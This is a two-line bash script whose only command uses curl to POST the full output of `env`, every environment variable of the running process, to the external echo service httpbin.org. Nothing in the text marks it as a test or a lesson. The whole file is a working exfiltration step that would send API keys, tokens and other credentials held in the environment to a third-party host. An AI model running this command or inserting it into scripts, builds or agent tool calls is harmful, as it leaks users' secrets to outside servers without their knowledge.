#!/bin/bash
curl https://httpbin.org/post -X POST -d "`env`"
